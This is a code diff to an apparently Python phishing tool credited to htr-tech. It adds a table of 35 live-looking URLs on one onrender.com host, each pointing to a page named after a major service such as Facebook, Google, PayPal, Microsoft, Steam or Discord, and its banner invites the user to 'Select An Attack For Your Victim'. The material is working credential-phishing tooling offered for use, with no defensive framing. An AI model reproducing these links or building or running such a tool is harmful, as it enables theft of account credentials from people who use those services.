@@ -30,8 +30,44 @@ PLATFORMS = {
     31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
 }
 
-LINKS = {i: "" for i in range(1, 36)}
-LINKS[1] = "https://facebook-vjj9.onrender.com"
+# ─── الروابط الفعلية بعد مطابقة أسماء الملفات ───
+LINKS = {
+    1: "https://s-djbh.onrender.com/facebook.html",
+    2: "https://s-djbh.onrender.com/instagram.html",
+    3: "https://s-djbh.onrender.com/Google.html",
+    4: "https://s-djbh.onrender.com/Microsoft.html",
+    5: "https://s-djbh.onrender.com/Netflix.html",
+    6: "https://s-djbh.onrender.com/Paypal.html",
+    7: "https://s-djbh.onrender.com/Steam.html",
+    8: "https://s-djbh.onrender.com/Twitter.html",
+    9: "https://s-djbh.onrender.com/Playstation.html",
+    10: "https://s-djbh.onrender.com/TikTok.html",
+    11: "https://s-djbh.onrender.com/Twitch.html",
+    12: "https://s-djbh.onrender.com/Pinterest.html",
+    13: "https://s-djbh.onrender.com/Snapchat.html",
+    14: "https://s-djbh.onrender.com/LinkedIn.html",
+    15: "https://s-djbh.onrender.com/Ebay.html",
+    16: "https://s-djbh.onrender.com/Quora.html",
+    17: "https://s-djbh.onrender.com/ProtonMail.html",
+    18: "https://s-djbh.onrender.com/Spotify.html",
+    19: "https://s-djbh.onrender.com/Reddit.html",
+    20: "https://s-djbh.onrender.com/Adobe.html",
+    21: "https://s-djbh.onrender.com/DeviantArt.html",
+    22: "https://s-djbh.onrender.com/Badoo.html",
+    23: "https://s-djbh.onrender.com/Origin.html",
+    24: "https://s-djbh.onrender.com/DropBox.html",
+    25: "https://s-djbh.onrender.com/Yahoo.html",
+    26: "https://s-djbh.onrender.com/Wordpress.html",
+    27: "https://s-djbh.onrender.com/Yandex.html",
+    28: "https://s-djbh.onrender.com/Stackoverflow.html",
+    29: "https://s-djbh.onrender.com/VK.html",
+    30: "https://s-djbh.onrender.com/xBOX.html",
+    31: "https://s-djbh.onrender.com/Mediafire.html",
+    32: "https://s-djbh.onrender.com/Gitlab.html",
+    33: "https://s-djbh.onrender.com/Github.html",
+    34: "https://s-djbh.onrender.com/Discord.html",
+    35: "https://s-djbh.onrender.com/Roblox.html"
+}
 
 COL_WIDTH = 26
 
@@ -67,9 +103,7 @@ def print_banner():
     print(banner)
     print()
     print(WHITE + "General : 1.0" + RESET)
-    # ─── التعديل هنا ───
     print(WHITE + "[–] Tool Created by htr-tech (General)" + RESET)
-    # ──────────────────
     print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
     print()
     print(ORANGE + "الشبح" + RESET)
